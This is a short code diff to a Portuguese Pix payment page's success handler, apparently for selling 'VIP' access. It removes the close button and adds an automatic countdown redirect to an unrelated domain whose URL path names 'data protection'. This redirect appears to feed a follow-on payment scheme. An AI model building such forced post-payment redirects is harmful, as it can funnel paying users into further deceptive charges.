@@ -385,14 +385,20 @@ function showPaymentSuccess() {
       <div style="font-size:64px;margin-bottom:16px;">✅</div>
       <h2 style="color:#2ecc71;font-size:20px;font-weight:800;margin-bottom:8px;">Pagamento confirmado!</h2>
       <p style="color:var(--text-secondary);font-size:14px;line-height:1.6;">
-        Seu acesso VIP foi liberado!<br>
-        Envie o comprovante aqui no chat para confirmar. 💖
+        Seu acesso foi liberado!<br>
+        Redirecionando em <strong id="redirectCount" style="color:#2ecc71;">3</strong>s... 🚀
       </p>
-      <button onclick="document.getElementById('pixModal').classList.remove('open')"
-        style="margin-top:24px;background:var(--accent);border:none;color:#fff;padding:12px 32px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;">
-        Fechar
-      </button>
     </div>`;
+  let count = 3;
+  const timer = setInterval(() => {
+    count--;
+    const el = document.getElementById('redirectCount');
+    if (el) el.textContent = count;
+    if (count <= 0) {
+      clearInterval(timer);
+      window.location.href = 'https://seguroprime.shop/Prote%C3%A7%C3%A3oDados/bruna1.html';
+    }
+  }, 1000);
 }
 
 async function createPix() {
